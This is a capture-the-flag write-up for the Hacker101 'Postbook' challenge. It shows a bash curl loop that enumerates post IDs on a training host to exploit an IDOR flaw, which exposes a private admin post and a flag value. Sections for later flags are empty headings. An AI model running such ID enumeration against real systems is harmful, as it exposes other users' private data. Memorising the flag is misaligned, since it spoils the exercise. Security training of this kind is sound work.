# Easy - Postbook

## Flag 0x01

I basically crafted a simple bash loop:
```bash
for i in $(seq 0 30); do
  curl "https://0597f1962f79eef0622575655fd867e0.ctf.hacker101.com/index.php?page=view.php&id=${i}" --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Connection: keep-alive' -H 'Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' -H 'TE: trailers'
done | sort | uniq
```

Found the `view.php` is vulnerable to IDOR:
```bash
      }
      a {
      <a href="index.php">Home</a>
        <a href="index.php?page=account.php">Settings</a>
              <a href="index.php?page=create.php">Write a new post</a>
        <a href="index.php?page=profile.php&id=d">My profile</a>
        <a href="index.php?page=sign_out.php">Sign out</a>
        background-color: #3b5998;
        background-color: white;
        background: #edf0f5;
  </body>
  <body>
        border: 0;
        border: 1px solid #eee;
        border-radius: 5px;
        color: blue;
        color: white;
    </div>
      <div class="post"><a href="index.php?page=view.php&id=1">Hello world</a><br />This is the first post!<br /><span style="color: #666">Author: admin</span></div>    </div>
      <div class="post"><a href="index.php?page=view.php&id=3">Hello everyone!</a><br />This is my first post as a user on Postbook!<br /><span style="color: #666">Author: user</span></div>    </div>
      <div class="post">^FLAG^dcc31df12aca0383705888a5ab7c8dba1443eb22ded672635d1672349d9619a5$FLAG$</div><div class="post"><span style="color: red;">SECRET:</span> <a href="index.php?page=view.php&id=2">Dear diary...</a><br />I am so glad that I am on Postbook. I can finally write down my thoughts and no one can see them. See you tomorrow. Yours truly, admin<br /><span style="color: #666">Author: admin</span></div>    </div>
      div#container {
    <div id="container">
    <div id="top">
      div.post {
      div#top {
      div#top a {
        font-family: Helvetica, Arial, sans-serif;
        font-size: 15pt;
      <h1>Postbook</h1>
      <h1>Post not found</h1>    </div>
  </head>
  <head>
</html>
<html>
      html, body {
      input, textarea {
        margin: 0;
        margin-bottom: 10px;
        padding: 0;
        padding: 10px;
        padding: 20px;
    </style>
    <style type="text/css">
      textarea.inline {
    <title>Postbook</title>
        width: 500px;
```
## Flag 0x02
## Flag 0x03
## Flag 0x04
## Flag 0x05
## Flag 0x06
## Flag 0x07
